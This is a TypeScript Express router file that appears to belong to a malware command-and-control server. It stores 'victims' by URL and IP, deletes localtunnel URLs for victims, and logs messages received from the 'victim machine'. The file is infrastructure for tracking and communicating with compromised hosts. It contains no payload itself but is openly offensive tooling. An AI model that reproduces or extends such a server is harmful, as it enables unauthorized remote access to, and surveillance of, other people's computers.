import { Request, Response, Router } from 'express';
import db from '../db';
import { Victim } from '../db/types';

// Init router
const router = Router();

/* * Router Endpoints * */

/**
 * Add new victim
 */
router.post('/', (req: Request, res: Response) => {
  const { url, ip, createdAt } = req.body;
  console.log(`[Victim] ${url} has been saved to DB`);
  db.push(
    '/victims[]',
    {
      url,
      ip,
      createdAt,
    },
    true
  );
  return res.status(200).send();
});

/**
 * Remove localtunnel's URL off Victim collection
 */
router.delete('/tunnels', (req: Request, res: Response) => {
  const { tunnelURL } = req.query;
  // Find and Delete by
  for (let i = 0; i < db.count('/victims'); i++) {
    const victimURL = db.getObject<Victim>(`/victims[${i}]`).url;
    if (victimURL === tunnelURL) {
      console.log(`[Victim] ${victimURL} has been removed from DB`);
      db.delete(`/victims[${i}]`);
      return res.status(200).send();
    }
  }
  return res.status(404).send();
});

/**
 * Receive messages from victim machine
 */
router.post('/msg', (req: Request, res: Response) => {
  const { msg } = req.body;
  console.log(`[Victim] ${msg}`);
  return res.status(200).send();
});

export default router;
